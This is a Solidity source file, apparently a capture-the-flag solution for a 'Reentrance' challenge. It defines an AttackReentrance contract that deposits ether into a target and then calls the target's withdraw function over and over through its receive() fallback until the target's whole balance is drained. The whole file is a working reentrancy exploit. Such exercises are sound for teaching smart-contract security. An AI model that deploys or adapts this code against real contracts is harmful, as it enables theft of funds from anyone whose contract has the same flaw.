// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IReentrance {
    function donate(address _to) external payable;

    function balanceOf(address _who) external view returns (uint balance);

    function withdraw(uint _amount) external;
}

contract AttackReentrance {
    address reentrance;
    uint256 initialDeposit;

    constructor(address _reentrance) {
        reentrance = _reentrance;
    }

    function attack() external payable {
        require(msg.value >= 0.1 ether, "send some more ether");

        // deposit some funds
        initialDeposit = msg.value;
        IReentrance(reentrance).donate{value: initialDeposit}(address(this));

        // withdraw these funds again and again (recursive call)
        withdraw();
    }

    receive() external payable {
        // re-entrance called by challenge
        withdraw();
    }

    function withdraw() private {
        // this balance correctly updates after withdraw
        uint256 challengeTotalRemainingBalance = address(reentrance).balance;
        // check if there are there more empty tokens
        bool keepRecursing = challengeTotalRemainingBalance > 0;

        if (keepRecursing) {
            // can only withdraw at most the initial balance per withdraw call
            uint256 toWithdraw = initialDeposit < challengeTotalRemainingBalance
                ? initialDeposit
                : challengeTotalRemainingBalance;

            IReentrance(reentrance).withdraw(toWithdraw);
        }
    }
}
